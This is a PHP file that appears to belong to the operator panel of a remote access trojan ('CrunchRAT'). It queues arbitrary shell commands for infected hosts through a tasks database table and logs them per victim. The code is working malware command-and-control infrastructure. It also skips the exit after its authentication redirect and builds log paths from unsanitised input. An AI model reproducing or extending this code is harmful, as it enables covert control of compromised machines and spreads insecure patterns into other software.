<?php
	# Necessary at the top of every page for session management
    session_start();

    include "connector.php";

    # If unauthenticated
    if (!isset($_SESSION["authenticated"])) {
        header("Location: 403.php");
    }

    # Parses POST parameters
    $hostname = $_POST["hostname"];
    $process_id = $_POST["process_id"];
    $command = $_POST["command"];

    # Generates unique ID and inserts entry into "tasks" table
    $statement = $database_connection->prepare("INSERT INTO tasks (`hostname`, `process_id`, `task_action`, `task_secondary`, `unique_id`) VALUES (:hostname, :process_id, :task_action, :task_secondary, :unique_id)");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->bindValue(":task_action", "command");
    $statement->bindValue(":task_secondary", $command);
    $statement->bindValue(":unique_id", uniqid());
    $statement->execute();
	$statement->connection = null;

    $log_path = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";
    file_put_contents($log_path, "\nTasked command: " . htmlentities($command) . "\n", FILE_APPEND);

    # Redirects to previous page
    header("Location: " . $_SERVER["HTTP_REFERER"]);
?>